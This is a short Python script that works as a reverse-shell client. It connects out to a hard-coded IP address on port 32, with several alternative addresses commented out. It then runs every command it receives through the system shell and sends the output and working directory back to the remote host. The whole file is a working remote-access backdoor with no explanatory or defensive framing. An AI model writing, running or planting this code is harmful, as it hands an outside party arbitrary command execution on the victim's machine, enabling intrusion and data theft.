import socket
import os
import subprocess

s = socket.socket()

# host = "192.168.43.85"
# host = "35.173.69.207"
# host = "192.168.43.85"
# host = "172.18.255.255"
# host = "157.41.125.55"
host = "34.87.129.210"

port = 32

print(port)

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        crrWD = os.getcwd() + ">"

        s.send(str.encode(output_str + crrWD))

        print(output_str)